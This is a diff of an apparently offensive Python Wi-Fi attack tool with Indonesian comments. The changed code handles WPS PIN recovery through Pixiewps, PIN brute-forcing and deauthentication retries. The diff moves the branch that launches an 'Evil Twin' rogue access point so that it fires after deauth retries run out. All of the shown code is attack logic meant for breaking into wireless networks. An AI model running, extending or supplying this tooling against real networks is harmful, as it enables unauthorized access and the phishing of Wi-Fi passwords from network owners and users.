@@ -866,7 +866,7 @@ address=/#/192.168.1.1
             elif pixiemode and self.pixie_creds.got_all():
                 new_pin = self.__runPixiewps(showpixiecmd, pixieforce)
                 if new_pin:
-                    # Ubah mode menjadi non-pixie dan ulangi loop dengan pin baru
+                   
                     pixiemode = False
                     pin = new_pin
                     self.deauth_retries = 0
@@ -875,7 +875,6 @@ address=/#/192.168.1.1
                     print('[!] Pixiewps gagal mendapatkan PIN.')
                     return self.smart_bruteforce(bssid, start_pin=None, delay=self.delay, interactive=False)
 
-            # Jika terjadi NACK atau FAIL dan deauth diaktifkan
             elif self.connection_status.status in ('WSC_NACK', 'WPS_FAIL') and self.max_deauth_retries > 0:
                 if self.deauth_retries < self.max_deauth_retries:
                     self.deauth_retries += 1
@@ -891,19 +890,15 @@ address=/#/192.168.1.1
                     print("[-] Batas percobaan deauth tercapai. PIN mungkin salah atau AP terkunci permanen.")
                     if store_pin_on_fail:
                         self.__savePin(bssid, pin)
+                    
+                    if self.evil_twin and bssid:
+                        print("[*] WPS and handshake failed. Launching Evil Twin attack...")
+                        channel = self._get_channel(bssid)
+                        essid = self.connection_status.essid or bssid
+                        if self._run_evil_twin(bssid, essid, channel, self.interface):
+                            return True
+                   
                     return False
-            else:
-                # Kegagalan lain (misal WPS_FAIL tanpa lock)
-                if store_pin_on_fail:
-                    self.__savePin(bssid, pin)
-                # Jika evil-twin diaktifkan, coba serangan Evil Twin
-                if self.evil_twin and bssid:
-                    print("[*] WPS and handshake failed. Launching Evil Twin attack...")
-                    channel = self._get_channel(bssid)
-                    essid = self.connection_status.essid or bssid
-                    if self._run_evil_twin(bssid, essid, channel, self.interface):
-                        return True
-                return False
 
     def __first_half_bruteforce(self, bssid, f_half, delay=None):
         """
